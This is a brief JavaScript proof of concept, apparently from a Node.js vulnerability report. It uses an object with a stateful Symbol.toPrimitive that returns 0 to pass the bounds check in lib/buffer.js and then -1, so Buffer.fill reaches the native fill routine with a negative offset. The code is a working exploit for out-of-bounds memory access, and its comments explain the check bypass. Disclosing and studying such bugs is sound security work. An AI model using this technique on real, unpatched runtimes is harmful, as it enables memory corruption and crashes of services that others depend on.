// Allocate a buffer
buff = Buffer.alloc(1);
ctr = 0

// Define start as an object instead of a number. When comparisons are
// called, they will call the underlying toPrimitive with the hint "number".
// We can define this function:
var start = {
    [Symbol.toPrimitive](hint) {
      if (ctr <= 0) {
          // We use this condition to get around the check in lib/buffer.js
          console.log("Returning 0, benign start")
          ctr = ctr + 1;
          return 0;
      } else {
          // Once buffer.js calls the C++ implemenation of fill, return -1
          console.log("Returning minus one");
          return -1;
      }
    }
};

newbuff = buff.fill(buff, start, 1);
